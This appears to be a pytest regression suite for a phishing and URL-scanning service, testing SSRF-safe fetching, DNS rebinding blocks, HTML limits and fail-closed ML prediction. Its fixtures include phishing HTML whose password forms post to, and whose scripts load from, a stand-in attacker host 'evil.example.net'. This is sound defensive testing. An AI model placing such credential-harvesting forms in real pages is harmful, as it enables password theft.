"""Security and correctness regressions against audited failure modes."""
import json
from pathlib import Path
from unittest.mock import Mock
from urllib.parse import urlsplit
import pandas as pd
import pytest
from app.security import outbound
from app.security.urls import InvalidURL
from ml.dataset import clean_source_dataset, compute_file_hash
from ml.features import FEATURE_ORDER, URL_FEATURE_ORDER, aggregate_feature_dict
from ml.inference import SecureSightPredictor
from utils import safe_fetch
from utils.html_features import extract_html_features, HTMLResourceLimit, HTML_FEATURE_NAMES
from utils.web_intelligence import analyze_web_intelligence
from utils.reputation_providers import MultiProviderAggregator, MockReputationProvider, ExternalAPIProvider
from utils.domain_cache import TTLMemoryCache
from utils.domain_extraction import extract_domain_components
from utils.url_features import extract_advanced_url_features

ROOT = Path(__file__).resolve().parents[1]

def response(status=200, headers=None, chunks=None):
    reply = Mock(status=status, headers=headers or {"Content-Type": "text/html"})
    reply.read1.side_effect = chunks or [b"<html>ok</html>", b""]
    return reply

@pytest.mark.parametrize("domain", ["google.com", "example.com", "secure-login.xyz", "microsoft.com"])
def test_www_lexical_invariance(domain):
    assert extract_advanced_url_features("https://" + domain + "/login?q=test") == extract_advanced_url_features("https://www." + domain + "/login?q=test")

def test_pinned_pool_never_delegates_hostname_connect(monkeypatch):
    monkeypatch.setattr(outbound, "resolve_public", lambda *a: ["8.8.8.8"])
    factory = Mock()
    monkeypatch.setattr(outbound.urllib3, "HTTPSConnectionPool", factory)
    parsed, _ = outbound.pinned_pool("https://example.com/login?q=x")
    assert parsed.hostname == "example.com"
    assert factory.call_args.kwargs["host"] == "8.8.8.8"
    assert factory.call_args.kwargs["server_hostname"] == "example.com"
    assert factory.call_args.kwargs["assert_hostname"] == "example.com"
    with pytest.raises(InvalidURL):
        outbound.pinned_pool("https://example.com/", addresses=["8.8.8.8", "127.0.0.1"])
    assert factory.call_count == 1

def test_get_redirect_to_private_dns_never_opens_second_connection(monkeypatch):
    def resolver(host, timeout):
        return ["8.8.8.8"] if host == "example.com" else ["127.0.0.1"]
    monkeypatch.setattr(outbound, "resolve_public", resolver)
    factory = Mock()
    first = response(302, {"Location": "//rebind.example/secret"})
    factory.return_value.urlopen.return_value = first
    monkeypatch.setattr(outbound.urllib3, "HTTPConnectionPool", factory)
    result = safe_fetch.fetch_webpage_safely("http://example.com/start")
    assert result["status"] == "SSRF_BLOCKED"
    assert result["html_content"] is None
    assert factory.call_count == 1
    first.close.assert_called_once()
    factory.return_value.close.assert_called_once()

@pytest.mark.parametrize("status,headers,expected", [
    (500, {"Content-Type": "text/html"}, "HTTP_ERROR"),
    (200, {}, "CONTENT_TYPE_UNSUPPORTED"),
    (200, {"Content-Type": "text/html", "Content-Encoding": "gzip"}, "CONTENT_TYPE_UNSUPPORTED"),
    (200, {"Content-Type": "text/html", "Content-Length": "200"}, "RESOURCE_LIMIT_EXCEEDED"),
])
def test_get_rejects_unanalysable_response_and_closes(monkeypatch, status, headers, expected):
    reply = response(status, headers)
    reply.headers = headers
    pool = Mock()
    pool.urlopen.return_value = reply
    monkeypatch.setattr(safe_fetch, "pinned_pool", lambda *a, **kw: (urlsplit("https://example.com/"), pool))
    result = safe_fetch.fetch_webpage_safely("https://example.com/", max_bytes=100)
    assert result["status"] == expected
    assert result["html_content"] is None
    reply.close.assert_called_once()
    pool.close.assert_called_once()

def test_get_success_preserves_host_and_closes(monkeypatch):
    reply = response()
    pool = Mock()
    pool.urlopen.return_value = reply
    monkeypatch.setattr(safe_fetch, "pinned_pool", lambda *a, **kw: (urlsplit("https://example.com/path?q=1"), pool))
    result = safe_fetch.fetch_webpage_safely("https://example.com/path?q=1")
    assert result["status"] == "SUCCESS"
    assert pool.urlopen.call_args.args[:2] == ("GET", "/path?q=1")
    assert pool.urlopen.call_args.kwargs["headers"]["Host"] == "example.com"
    assert pool.urlopen.call_args.kwargs["redirect"] is False
    assert pool.urlopen.call_args.kwargs["retries"] is False
    reply.close.assert_called_once()
    pool.close.assert_called_once()

def test_dom_checks_all_forms_and_protocol_relative_resources():
    html = '<form action="/ok"><input type="password"></form><form action="//evil.example.net/collect"><input type="password"></form><script src="//evil.example.net/x.js"></script>'
    result = extract_html_features(html, "https://example.com/login")
    assert len(result["forms"]) == 2
    assert result["forms"][0]["is_external"] is False
    assert result["forms"][1]["is_external"] is True
    assert result["html_features"]["external_script_count"] == 1
    assert any(i["code"] == "EXTERNAL_CREDENTIAL_FORM" for i in analyze_web_intelligence("https://example.com", html)["indicators"])

@pytest.mark.parametrize("html", ["<div>" * 257, "<input>" * 10001, "x" * (1024 * 1024 + 1)], ids=["depth", "nodes", "bytes"])
def test_dom_resource_limits(html):
    with pytest.raises(HTMLResourceLimit):
        extract_html_features(html, "https://example.com/")

def test_missing_html_stays_missing(monkeypatch):
    import utils.web_intelligence as web
    monkeypatch.setattr(web, "fetch_webpage_safely", lambda *a: {"status":"TIMEOUT","error_message":"unavailable"})
    result = web.analyze_web_intelligence("https://example.com/")
    assert result["status"] == "TIMEOUT"
    assert all(v is None for v in result["combined_web_features"].values())
    vector = aggregate_feature_dict(extract_advanced_url_features("https://example.com/"), {}, result)
    assert all(vector[key] is None for key in HTML_FEATURE_NAMES)

def test_partial_providers_cannot_announce_safe(monkeypatch):
    monkeypatch.setenv("REPUTATION_API_KEY", "test-placeholder")
    assert ExternalAPIProvider().lookup_domain("example.com")["status"] == "UNAVAILABLE"
    result = MultiProviderAggregator([MockReputationProvider("a","SAFE"),MockReputationProvider("b","ERROR")]).aggregate_lookup("example.com")
    assert result["reputation_status"] != "SAFE"

def test_cache_bounded_and_no_mutation():
    cache = TTLMemoryCache(max_entries=2)
    cache.set("a", {"items":[1]})
    cache.get("a")["items"].append(2)
    assert cache.get("a") == {"items":[1]}
    cache.set("b", 2); cache.set("c", 3)
    assert cache.get("a") is None

def test_publisher_label_conversion_and_private_suffix_grouping():
    rows, metadata = clean_source_dataset(pd.DataFrame({"URL":["https://good.com/","https://bad.com/"],"label":[1,0]}))
    assert dict(zip(rows.url, rows.label)) == {"https://good.com/":0,"https://bad.com/":1}
    assert metadata["source_label_mapping"] == {"0":"phishing","1":"legitimate"}
    assert extract_domain_components("https://a.github.io")["registrable_domain"] != extract_domain_components("https://b.github.io")["registrable_domain"]
    assert extract_domain_components("https://a.invalid")["registrable_domain"] != extract_domain_components("https://b.invalid")["registrable_domain"]

def test_frozen_feature_hashes():
    folder = ROOT / "data/v5_1_1"
    manifest = json.loads((folder / "manifest.json").read_text())
    for name, expected in manifest["files"].items():
        assert compute_file_hash(folder/name) == expected
    features = pd.read_parquet(folder/"features.parquet")
    assert list(features.columns) == FEATURE_ORDER
    assert features[URL_FEATURE_ORDER].notna().all().all()
    assert features[[k for k in FEATURE_ORDER if k not in URL_FEATURE_ORDER]].isna().all().all()

def test_missing_and_corrupt_artifacts_fail_closed(tmp_path):
    predictor = SecureSightPredictor()
    assert predictor.load()["status"] == "OK"
    for invalid in [{}, {"url_len":50}, {key:0 for key in URL_FEATURE_ORDER}]:
        result = predictor.predict(invalid)
        assert result["status"] != "OK"
        assert result["probability"] is None and result["prediction"] is None
    for name in ("model_metadata.json","feature_schema.json","threshold.json","preprocessor.pkl"):
        (tmp_path/name).write_bytes((ROOT/"models/v5"/name).read_bytes())
    (tmp_path/"model.pkl").write_bytes(b"corrupt data must never be unpickled")
    assert SecureSightPredictor(str(tmp_path)).load()["status"] == "MODEL_LOAD_FAILED"

@pytest.mark.parametrize("path", ["/api/v1/features/url","/api/v1/intelligence/domain","/api/v1/analyze/webpage","/api/v1/ml/predict"])
def test_all_heavy_endpoints_share_capacity(app, path):
    slots = app.extensions["scan_slots"]
    for _ in range(app.config["MAX_CONCURRENT_SCANS"]):
        assert slots.acquire(False)
    try:
        assert app.test_client().post(path, json={}).status_code == 503
    finally:
        for _ in range(app.config["MAX_CONCURRENT_SCANS"]):
            slots.release()

def test_main_scan_uses_corrected_model_and_incomplete_not_safe(client, app):
    result = client.post("/api/v1/scan", json={"url":"https://google.com/"}).json
    assert result["ml_result"]["model_version"] == "5.1.1"
    assert result["decision"] == "Analysis incomplete"
    assert len(result["feature_vector"]) == len(FEATURE_ORDER)
    app.extensions["models"]["url"] = None
    result = client.post("/api/v1/scan", json={"url":"https://google.com/"}).json
    assert result["ml_probability"] is None
    assert result["decision"] == "Analysis incomplete"

@pytest.mark.parametrize("payload", [
    {"features":{},"include_explanations":"yes"},
    {"features":{},"explanation_top_k":5.5},
    {"features":{},"explanation_top_k":True},
    {"features":{},"explanation_top_k":0},
    {"features":{},"feature_schema_version":"4.0"},
    {"features":{},"unexpected":"bad"},
    {"features":[]}, {},
])
def test_ml_api_rejects_invalid_contract(client, payload):
    reply = client.post("/api/v1/ml/predict", json=payload)
    assert reply.status_code == 400
    assert reply.json["error"]["code"]

def test_ml_api_valid_vector_and_no_fabricated_features(client):
    reply = client.post("/api/v1/ml/predict", json={"features":extract_advanced_url_features("https://google.com/"),"include_explanations":False})
    assert reply.status_code == 200
    assert reply.json["status"] == "OK"
    assert reply.json["feature_schema_version"] == "5.1.1"
    assert reply.json["probability"] is not None
    assert reply.json["unavailable_features"]

def test_ml_api_missing_required_does_not_predict(client):
    reply = client.post("/api/v1/ml/predict", json={"features":{}})
    assert reply.status_code == 400
    assert reply.json["prediction"] is None
    assert reply.json["probability"] is None

def test_scan_decisions_use_observed_web_evidence(client, monkeypatch):
    from app.services import scans
    monkeypatch.setattr(scans, "analyze_domain_intelligence", lambda *a: {
        "dns":{"status":"SUCCESS","is_ssrf_safe":True},
        "registration":{"status":"AVAILABLE","domain_age_days":3650},
        "tls":{"status":"VALID","certificate_valid":True},
        "reputation":{"reputation_status":"UNKNOWN"},
        "domain_features":{},
    })
    html = '<title>Example portal</title><form action="/login"><input type="password"></form>'
    monkeypatch.setattr(scans, "analyze_web_intelligence", lambda url: analyze_web_intelligence(url, html))
    result = client.post("/api/v1/scan", json={"url":"https://example.com/"}).json
    # Phase 13: unconfirmed reputation/partial history cannot establish safety.
    assert result["decision"] == "Analysis incomplete"
    assert result["verdict"] == "UNKNOWN"
    html = '<title>Microsoft Account Verification</title><form action="//evil.example.net/collect"><input type="password"></form>'
    result = client.post("/api/v1/scan", json={"url":"https://example.com/"}).json
    # Phase 9: title alone is not corroborated brand impersonation. External
    # credential collection still prevents an unwarranted legitimate verdict.
    assert result["decision"] == "Suspicious"
    assert result["verdict"] == "SUSPICIOUS"
    assert result["brand_intelligence"]["features"]["corroborated_brand_mismatch"] == 0
    assert "CORROBORATED_CREDENTIAL_HARVESTING" not in result["evidence"]

def test_frozen_domains_disjoint_and_oof_folds():
    from sklearn.linear_model import LogisticRegression
    from sklearn.pipeline import make_pipeline
    from sklearn.impute import SimpleImputer
    from sklearn.preprocessing import StandardScaler
    from ml.ensemble import StackingEnsembleClassifier
    frozen = json.loads((ROOT/"data/v5_1_1/splits.json").read_text())
    sets = [set(p["domains"]) for p in frozen.values()]
    assert all(not a & b for i,a in enumerate(sets) for b in sets[i+1:])
    features = pd.DataFrame({"x":[float(i % 9) for i in range(120)]})
    labels = pd.Series([i % 2 for i in range(120)])
    groups = [i // 2 for i in range(120)]
    pipeline = make_pipeline(SimpleImputer(), StandardScaler(), LogisticRegression())
    model = StackingEnsembleClassifier({"lr":pipeline}, n_folds=3).fit(features, labels, groups)
    assert len(model.fold_audit_) == 3
    assert all(fold["domain_overlap"] == 0 for fold in model.fold_audit_)

def test_tls_pins_public_literal_and_verifies_original_hostname(monkeypatch):
    import utils.tls_intelligence as tls
    connection = Mock()
    connection.__enter__ = Mock(return_value=connection)
    connection.__exit__ = Mock(return_value=False)
    secure = Mock()
    secure.__enter__ = Mock(return_value=secure)
    secure.__exit__ = Mock(return_value=False)
    secure.getpeercert.return_value = {"notAfter":"Oct  8 12:00:00 2028 GMT","notBefore":"Oct  8 12:00:00 2025 GMT"}
    context = Mock()
    context.wrap_socket.return_value = secure
    factory = Mock(return_value=connection)
    monkeypatch.setattr(tls.socket, "create_connection", factory)
    monkeypatch.setattr(tls.ssl, "create_default_context", lambda:context)
    result = tls.analyze_tls_certificate("example.com", resolved_ips=["8.8.8.8"])
    assert result["status"] == "VALID"
    assert factory.call_args.args[0] == ("8.8.8.8",443)
    assert context.wrap_socket.call_args.kwargs["server_hostname"] == "example.com"
    result = tls.analyze_tls_certificate("example.com", resolved_ips=["8.8.8.8","127.0.0.1"])
    assert result["status"] == "SSRF_BLOCKED"
    assert factory.call_count == 1
